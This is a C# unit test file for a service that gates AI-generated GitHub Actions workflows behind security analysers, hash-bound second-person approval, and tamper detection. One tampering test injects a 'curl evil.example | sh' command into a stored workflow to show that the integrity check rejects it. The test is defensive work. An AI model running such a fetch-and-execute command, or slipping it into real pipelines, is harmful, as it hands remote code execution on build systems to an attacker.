using GitHubMigrator.Business;
using GitHubMigrator.Business.WorkflowGates;
using GitHubMigrator.Domain.Tests.WorkflowGates;
using static GitHubMigrator.Domain.Tests.WorkflowGates.WorkflowSamples;

namespace GitHubMigrator.Domain.Tests.Ai;

internal sealed class InMemoryProposalRepository : IWorkflowProposalRepository
{
    public Dictionary<Guid, WorkflowProposal> Rows { get; } = [];
    public List<ProposalEvent> Log { get; } = [];
    // runs after the service read the row and before it tries to move it: another reviewer deciding first
    public Action<Guid>? BeforeTransition { get; set; }

    public Task AddAsync(WorkflowProposal proposal, ProposalEvent created, CancellationToken ct)
    {
        Rows[proposal.Id] = proposal;
        Log.Add(created with { Id = Log.Count + 1 });
        return Task.CompletedTask;
    }

    public Task<WorkflowProposal?> GetAsync(Guid id, CancellationToken ct) => Task.FromResult(Rows.GetValueOrDefault(id));

    public Task<IReadOnlyList<ProposalSummary>> ListAsync(Guid sourceConnectionId, string projectId, int pipelineId, int limit, CancellationToken ct) =>
        Task.FromResult<IReadOnlyList<ProposalSummary>>(Rows.Values
            .Where(p => p.SourceConnectionId == sourceConnectionId && p.ProjectId == projectId && p.PipelineId == pipelineId)
            .OrderByDescending(p => p.CreatedAtUtc).Take(limit)
            .Select(p => new ProposalSummary(p.Id, p.State, p.Reason, p.WorkflowSha256, p.CreatedBy, p.CreatedAtUtc, p.AiConnectionId)).ToArray());

    public Task<IReadOnlyList<ProposalEvent>> EventsAsync(Guid id, CancellationToken ct) =>
        Task.FromResult<IReadOnlyList<ProposalEvent>>(Log.Where(e => e.ProposalId == id).OrderBy(e => e.Id).ToArray());

    public Task<bool> TransitionAsync(Guid id, ProposalState from, ProposalState to, string? approvedSha256, ProposalEvent evt, CancellationToken ct)
    {
        BeforeTransition?.Invoke(id);
        if (!Rows.TryGetValue(id, out var row) || row.State != from) return Task.FromResult(false);
        Rows[id] = row with { State = to, ApprovedSha256 = to == ProposalState.Approved ? approvedSha256 : row.ApprovedSha256 };
        Log.Add(evt with { Id = Log.Count + 1 });
        return Task.FromResult(true);
    }
}

public sealed class WorkflowProposalServiceTests
{
    internal static readonly DateTimeOffset Now = new(2026, 11, 13, 12, 0, 0, TimeSpan.Zero);
    internal static readonly ProposalActor Author = new(Guid.Parse("aaaaaaaa-0000-0000-0000-000000000001"), "author");
    internal static readonly ProposalActor Reviewer = new(Guid.Parse("bbbbbbbb-0000-0000-0000-000000000002"), "reviewer");
    internal static readonly Guid SourceId = Guid.Parse("11111111-1111-1111-1111-111111111111");
    internal static readonly Guid AiId = Guid.Parse("22222222-2222-2222-2222-222222222222");

    private sealed class FixedTime : TimeProvider { public override DateTimeOffset GetUtcNow() => Now; }

    private static IWorkflowGatePipelineFactory Analysers(bool present = true) => new WorkflowGatePipelineFactory(
        present ? new FakeToolRunner("actionlint", new(true, "[]", null, 0)) : null, present ? new FakeToolRunner("zizmor", new(true, "[]", null, 0)) : null);

    internal static WorkflowProposalService Service(InMemoryProposalRepository repo, bool secondApprover = true, bool analysers = true, WorkflowGatePolicy? policy = null) =>
        new(repo, Analysers(analysers), new FixedTime(), new() { RequireSecondApprover = secondApprover }, policy);

    // the same text with pins the product verified, so that it has no warning
    private static string WithHeader(string yaml) => "# azure-tasks: converted=UseDotNet@2 manual=none\n" + yaml;

    internal static readonly string Clean = WithHeader(Good.Replace(CheckoutSha, ActionCatalog.All.Single(a => a.Repository == "actions/checkout").Sha)
        .Replace(SetupDotnetSha, ActionCatalog.All.Single(a => a.Repository == "actions/setup-dotnet").Sha));

    internal static readonly ConversionPlan Plan = new([new("NUGET_API_KEY", "pipeline variable")], [], [], []);

    internal static async Task<ConversionProposal> ConvertedAsync(string yaml, bool analysers = true)
    {
        var report = await Analysers(analysers).Create(WorkflowGatePolicy.Default).RunAsync(yaml, Plan.ToGateContextFor(["UseDotNet@2"]), default);
        var provenance = new ConversionProvenance(AiId, "OpenAICompatible", "llm.corp.example", "gpt-x", "gpt-x-2025", new string('a', 64), Plan.Sha256,
            WorkflowGatePolicy.Default.Version, "2026-11-13", [new("SENSITIVE_LITERAL", 2)], 100, 50,
            [new(1, report.Approvable ? "GatesPassed" : "Blocked", 100, 50, report.WorkflowSha256, [])], Now);
        return new(report.Approvable ? ConversionStatus.ReadyForReview : ConversionStatus.Blocked, report.Approvable ? null : "GatesBlocked", yaml,
            report.WorkflowSha256, "Triggers are not converted.", report, Plan, provenance) { SourceTasks = ["UseDotNet@2"], PipelineName = "Orion API CI/CD" };
    }

    internal static async Task<(InMemoryProposalRepository Repo, WorkflowProposal Proposal)> ProposedAsync(string? yaml = null)
    {
        var repo = new InMemoryProposalRepository();
        var kept = await Service(repo).RecordAsync(Author, SourceId, "project", 42, AiId, await ConvertedAsync(yaml ?? Clean), default);
        return (repo, kept!);
    }

    [Fact]
    public async Task Only_an_answer_a_model_produced_is_kept_and_a_blocked_one_is_kept_without_its_text()
    {
        var repo = new InMemoryProposalRepository();
        var service = Service(repo);

        var nothingSent = ConversionProposal.NotAttempted("SourceConsentRequired", Plan);
        Assert.Null(await service.RecordAsync(Author, SourceId, "project", 42, AiId, nothingSent, default));
        Assert.Empty(repo.Rows);

        var ready = await service.RecordAsync(Author, SourceId, "project", 42, AiId, await ConvertedAsync(Clean), default);
        Assert.Equal(ProposalState.Proposed, ready!.State);
        Assert.Equal(Clean, ready.WorkflowYaml);
        Assert.Equal(WorkflowHash.Sha256(Clean), ready.WorkflowSha256);
        Assert.Equal(["UseDotNet@2"], ready.Evidence.SourceTasks);
        Assert.Equal("gpt-x", ready.Evidence.Provenance!.Model);
        Assert.Equal("author", ready.CreatedBy);
        Assert.True(ready.IntegrityOk);

        var blocked = await service.RecordAsync(Author, SourceId, "project", 42, AiId, await ConvertedAsync(PipeToShell), default);
        Assert.Equal(ProposalState.Blocked, blocked!.State);
        Assert.Equal("GatesBlocked", blocked.Reason);
        Assert.Null(blocked.WorkflowYaml); // the answer the gates stopped may be exactly the credential they found
        Assert.NotNull(blocked.WorkflowSha256);
        Assert.Contains(blocked.Evidence.Findings, f => f.Code == "REMOTE_SCRIPT_EXECUTION" && f.Severity == "Blocker");
        Assert.Equal(["Created", "Created"], repo.Log.Select(e => e.Type));
    }

    [Fact]
    public async Task A_workflow_whose_analysers_did_not_run_is_kept_as_blocked_never_as_proposed()
    {
        var repo = new InMemoryProposalRepository();
        var kept = await Service(repo).RecordAsync(Author, SourceId, "project", 42, AiId, await ConvertedAsync(Clean, analysers: false), default);
        Assert.Equal(ProposalState.Blocked, kept!.State);
        Assert.Null(kept.WorkflowYaml);
        await Assert.ThrowsAsync<WorkflowProposalException>(() => Service(repo).ApproveAsync(Reviewer, kept.Id, kept.WorkflowSha256, [], null, default));
    }

    [Fact]
    public async Task A_second_person_approves_the_exact_text_and_the_event_says_who_what_and_against_which_verdict()
    {
        var (repo, proposal) = await ProposedAsync();
        var approved = await Service(repo).ApproveAsync(Reviewer, proposal.Id, proposal.WorkflowSha256, [], "Read it line by line.", default);

        Assert.Equal(ProposalState.Approved, approved.State);
        Assert.Equal(proposal.WorkflowSha256, approved.ApprovedSha256);
        Assert.Equal(Clean, approved.WorkflowYaml);
        var evt = repo.Log.Last();
        Assert.Equal("Approved", evt.Type);
        Assert.Equal(Reviewer.Id, evt.ActorId);
        Assert.Equal("reviewer", evt.Actor);
        Assert.Equal(Now, evt.OccurredAtUtc);
        Assert.Equal(proposal.WorkflowSha256, evt.WorkflowSha256);
        Assert.Equal("Read it line by line.", evt.Note);
        Assert.Equal(64, evt.Detail!.ReportSha256!.Length);
        Assert.Equal(WorkflowGatePolicy.Default.Version, evt.Detail.PolicyVersion);
        Assert.Empty(evt.Detail.AcknowledgedWarnings);
    }

    [Fact]
    public async Task Approval_is_bound_to_the_text_the_approver_read()
    {
        var (repo, proposal) = await ProposedAsync();
        var service = Service(repo);
        foreach (var wrong in new string?[] { null, "", "  ", new string('0', 64), proposal.WorkflowSha256![..63], proposal.WorkflowSha256.ToUpperInvariant() })
        {
            var ex = await Assert.ThrowsAsync<WorkflowProposalException>(() => service.ApproveAsync(Reviewer, proposal.Id, wrong, [], null, default));
            Assert.Equal("WorkflowHashMismatch", ex.Code);
        }
        Assert.Equal(ProposalState.Proposed, repo.Rows[proposal.Id].State);
        Assert.Single(repo.Log);
    }

    [Fact]
    public async Task The_author_cannot_approve_their_own_proposal_unless_the_operator_switched_four_eyes_off()
    {
        var (repo, proposal) = await ProposedAsync();
        var ex = await Assert.ThrowsAsync<WorkflowProposalException>(() => Service(repo).ApproveAsync(Author, proposal.Id, proposal.WorkflowSha256, [], null, default));
        Assert.Equal("SecondApproverRequired", ex.Code);
        Assert.Equal(ProposalState.Proposed, repo.Rows[proposal.Id].State);

        var single = await Service(repo, secondApprover: false).ApproveAsync(Author, proposal.Id, proposal.WorkflowSha256, [], null, default);
        Assert.Equal(ProposalState.Approved, single.State);
    }

    [Fact]
    public async Task A_stored_text_that_no_longer_matches_its_hash_cannot_be_approved_or_released()
    {
        var (repo, proposal) = await ProposedAsync();
        repo.Rows[proposal.Id] = proposal with { WorkflowYaml = Clean.Replace("dotnet build", "dotnet build; curl evil.example | sh") };
        Assert.False(repo.Rows[proposal.Id].IntegrityOk);
        var actionlint = new FakeToolRunner("actionlint", new(true, "[]", null, 0));
        var zizmor = new FakeToolRunner("zizmor", new(true, "[]", null, 0));
        var counted = new WorkflowProposalService(repo, new WorkflowGatePipelineFactory(actionlint, zizmor), new FixedTime());
        var ex = await Assert.ThrowsAsync<WorkflowProposalException>(() => counted.ApproveAsync(Reviewer, proposal.Id, proposal.WorkflowSha256, [], null, default));
        Assert.Equal("ProposalIntegrityFailure", ex.Code);
        // refused before any analyser looked at the text
        Assert.Equal((0, 0), (actionlint.Calls, zizmor.Calls));

        repo.Rows[proposal.Id] = proposal with { State = ProposalState.Approved, ApprovedSha256 = proposal.WorkflowSha256, WorkflowYaml = Clean + "\n# tampered\n" };
        Assert.Equal("ProposalIntegrityFailure", (await Assert.ThrowsAsync<WorkflowProposalException>(() => Service(repo).RequireApprovedAsync(proposal.Id, default))).Code);
    }

    [Fact]
    public async Task Approval_runs_the_gates_again_so_a_tightened_policy_or_a_missing_analyser_stops_an_old_proposal()
    {
        var (repo, proposal) = await ProposedAsync();

        var noOwners = new WorkflowGatePolicy { AllowedActionOwners = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "somebody-else" } };
        var tightened = await Assert.ThrowsAsync<WorkflowProposalException>(() => Service(repo, policy: noOwners).ApproveAsync(Reviewer, proposal.Id, proposal.WorkflowSha256, [], null, default));
        Assert.Equal("GatesNoLongerPass", tightened.Code);
        Assert.NotEmpty(tightened.Details);

        var noTools = await Assert.ThrowsAsync<WorkflowProposalException>(() => Service(repo, analysers: false).ApproveAsync(Reviewer, proposal.Id, proposal.WorkflowSha256, [], null, default));
        Assert.Equal("GatesNoLongerPass", noTools.Code);
        Assert.Contains("actionlint:NotRun", noTools.Details);
        Assert.Contains("zizmor:NotRun", noTools.Details);

        Assert.Equal(ProposalState.Proposed, repo.Rows[proposal.Id].State);
        Assert.Single(repo.Log);
    }

    [Fact]
    public async Task Every_warning_of_the_fresh_run_has_to_be_accepted_by_name()
    {
        // Good keeps pins this product has not verified: two warnings of the same code
        var (repo, proposal) = await ProposedAsync(WithHeader(Good));
        Assert.Contains(proposal.Evidence.Findings, f => f.Code == "ACTION_PIN_NOT_VERIFIED" && f.Severity == "Warning");
        var service = Service(repo);

        var none = await Assert.ThrowsAsync<WorkflowProposalException>(() => service.ApproveAsync(Reviewer, proposal.Id, proposal.WorkflowSha256, null, null, default));
        Assert.Equal("WarningsNotAcknowledged", none.Code);
        Assert.Contains("ACTION_PIN_NOT_VERIFIED", none.Details);
        var wrong = await Assert.ThrowsAsync<WorkflowProposalException>(() => service.ApproveAsync(Reviewer, proposal.Id, proposal.WorkflowSha256, ["SOMETHING_ELSE"], null, default));
        Assert.Equal("WarningsNotAcknowledged", wrong.Code);
        Assert.Equal(ProposalState.Proposed, repo.Rows[proposal.Id].State);

        var approved = await service.ApproveAsync(Reviewer, proposal.Id, proposal.WorkflowSha256, ["ACTION_PIN_NOT_VERIFIED", "UNRELATED_EXTRA"], null, default);
        Assert.Equal(ProposalState.Approved, approved.State);
        // what is recorded is what the fresh run found, not what the approver typed
        Assert.Equal(["ACTION_PIN_NOT_VERIFIED"], repo.Log.Last().Detail!.AcknowledgedWarnings);
    }

    [Fact]
    public async Task A_proposal_is_decided_once_and_the_loser_of_a_race_changes_nothing()
    {
        var (repo, proposal) = await ProposedAsync();
        var service = Service(repo);
        await service.ApproveAsync(Reviewer, proposal.Id, proposal.WorkflowSha256, [], null, default);
        foreach (var again in new Func<Task>[]
        {
            () => service.ApproveAsync(Reviewer, proposal.Id, proposal.WorkflowSha256, [], null, default),
            () => service.RejectAsync(Reviewer, proposal.Id, "no longer wanted", default)
        })
            Assert.Equal("ProposalNotPending", (await Assert.ThrowsAsync<WorkflowProposalException>(again)).Code);

        var (raceRepo, raced) = await ProposedAsync();
        raceRepo.BeforeTransition = id => raceRepo.Rows[id] = raceRepo.Rows[id] with { State = ProposalState.Rejected };
        var ex = await Assert.ThrowsAsync<WorkflowProposalException>(() => Service(raceRepo).ApproveAsync(Reviewer, raced.Id, raced.WorkflowSha256, [], null, default));
        Assert.Equal("ProposalNotPending", ex.Code);
        Assert.Equal(ProposalState.Rejected, raceRepo.Rows[raced.Id].State);
        Assert.Single(raceRepo.Log); // no Approved event for a decision that did not happen
    }

    [Fact]
    public async Task Rejecting_and_revoking_need_a_reason_and_only_apply_from_the_right_state()
    {
        var (repo, proposal) = await ProposedAsync();
        var service = Service(repo);
        Assert.Equal("ProposalNotApproved", (await Assert.ThrowsAsync<WorkflowProposalException>(() => service.RevokeAsync(Reviewer, proposal.Id, "changed my mind", default))).Code);
        foreach (var missing in new string?[] { null, "", "  ", "ab", "\u0007\u0007\u0007" })
            Assert.Equal("NoteRequired", (await Assert.ThrowsAsync<WorkflowProposalException>(() => service.RejectAsync(Reviewer, proposal.Id, missing, default))).Code);

        var rejected = await service.RejectAsync(Reviewer, proposal.Id, "uses a deploy step we do not want", default);
        Assert.Equal(ProposalState.Rejected, rejected.State);
        Assert.Null(rejected.ApprovedSha256);
        Assert.Equal(("Rejected", "uses a deploy step we do not want"), (repo.Log.Last().Type, repo.Log.Last().Note));
        Assert.Equal("ProposalNotApproved", (await Assert.ThrowsAsync<WorkflowProposalException>(() => service.RevokeAsync(Reviewer, proposal.Id, "x revoke", default))).Code);

        var (repo2, second) = await ProposedAsync();
        var service2 = Service(repo2);
        await service2.ApproveAsync(Reviewer, second.Id, second.WorkflowSha256, [], null, default);
        var revoked = await service2.RevokeAsync(Author, second.Id, "found a problem in review", default);
        Assert.Equal(ProposalState.Revoked, revoked.State);
        Assert.Equal(second.WorkflowSha256, revoked.ApprovedSha256); // what had been approved stays on record
        Assert.Equal(["Created", "Approved", "Revoked"], repo2.Log.Select(e => e.Type));
        Assert.Equal("ProposalNotPending", (await Assert.ThrowsAsync<WorkflowProposalException>(() => service2.RejectAsync(Reviewer, second.Id, "too late", default))).Code);
    }

    [Fact]
    public async Task A_blocked_or_unknown_proposal_cannot_be_decided_on()
    {
        var repo = new InMemoryProposalRepository();
        var service = Service(repo);
        var blocked = (await service.RecordAsync(Author, SourceId, "project", 42, AiId, await ConvertedAsync(PipeToShell), default))!;
        Assert.Equal("ProposalNotPending", (await Assert.ThrowsAsync<WorkflowProposalException>(() => service.ApproveAsync(Reviewer, blocked.Id, blocked.WorkflowSha256, [], null, default))).Code);
        Assert.Equal("ProposalNotPending", (await Assert.ThrowsAsync<WorkflowProposalException>(() => service.RejectAsync(Reviewer, blocked.Id, "not needed", default))).Code);
        Assert.Equal("ProposalNotFound", (await Assert.ThrowsAsync<WorkflowProposalException>(() => service.ApproveAsync(Reviewer, Guid.NewGuid(), new string('a', 64), [], null, default))).Code);
        Assert.Equal("ProposalNotFound", (await Assert.ThrowsAsync<WorkflowProposalException>(() => service.RequireApprovedAsync(Guid.NewGuid(), default))).Code);
    }

    [Fact]
    public async Task Only_an_approved_proposal_that_was_not_revoked_releases_its_exact_text()
    {
        var (repo, proposal) = await ProposedAsync();
        var service = Service(repo);
        Assert.Equal("ProposalNotApproved", (await Assert.ThrowsAsync<WorkflowProposalException>(() => service.RequireApprovedAsync(proposal.Id, default))).Code);

        await service.ApproveAsync(Reviewer, proposal.Id, proposal.WorkflowSha256, [], null, default);
        var released = await service.RequireApprovedAsync(proposal.Id, default);
        Assert.Equal(Clean, released.WorkflowYaml);
        Assert.Equal(proposal.WorkflowSha256, released.WorkflowSha256);
        Assert.Equal(WorkflowHash.Sha256(released.WorkflowYaml), released.WorkflowSha256);

        await service.RevokeAsync(Reviewer, proposal.Id, "revoked on purpose", default);
        Assert.Equal("ProposalNotApproved", (await Assert.ThrowsAsync<WorkflowProposalException>(() => service.RequireApprovedAsync(proposal.Id, default))).Code);

        // an approval whose recorded hash is not the text's hash is not an approval of that text
        repo.Rows[proposal.Id] = proposal with { State = ProposalState.Approved, ApprovedSha256 = new string('f', 64) };
        Assert.Equal("ProposalIntegrityFailure", (await Assert.ThrowsAsync<WorkflowProposalException>(() => service.RequireApprovedAsync(proposal.Id, default))).Code);
    }

    [Fact]
    public async Task Notes_lose_control_characters_and_are_capped_and_the_list_is_per_pipeline_without_text()
    {
        var (repo, proposal) = await ProposedAsync();
        var service = Service(repo);
        await service.ApproveAsync(Reviewer, proposal.Id, proposal.WorkflowSha256, [], "ok\u0000\u001b[31m" + new string('x', 900), default);
        var note = repo.Log.Last().Note!;
        Assert.Equal(WorkflowProposalService.NoteMaxLength, note.Length);
        Assert.DoesNotContain('\u0000', note);
        Assert.DoesNotContain('\u001b', note);

        await service.RecordAsync(Author, SourceId, "project", 7, AiId, await ConvertedAsync(Clean), default);
        var list = await service.ListAsync(SourceId, "project", 42, default);
        Assert.Equal(proposal.Id, Assert.Single(list).Id);
        Assert.Empty(await service.ListAsync(SourceId, "other-project", 42, default));
    }

    [Fact]
    public async Task The_report_hash_follows_the_verdict_and_not_the_order_findings_were_produced_in()
    {
        var yaml = WithHeader(Good);
        var plan = Plan.ToGateContextFor(["UseDotNet@2"]);
        var report = await Analysers().Create(WorkflowGatePolicy.Default).RunAsync(yaml, plan, default);
        var reordered = report with { Gates = [.. report.Gates.Reverse().Select(g => g with { Findings = [.. g.Findings.Reverse()] })] };
        Assert.Equal(WorkflowProposalService.ReportHash(report), WorkflowProposalService.ReportHash(reordered));

        var other = await Analysers().Create(WorkflowGatePolicy.Default).RunAsync(Clean, plan, default);
        Assert.NotEqual(WorkflowProposalService.ReportHash(report), WorkflowProposalService.ReportHash(other));
        var noTools = await Analysers(false).Create(WorkflowGatePolicy.Default).RunAsync(Clean, plan, default);
        Assert.NotEqual(WorkflowProposalService.ReportHash(other), WorkflowProposalService.ReportHash(noTools));
    }
}
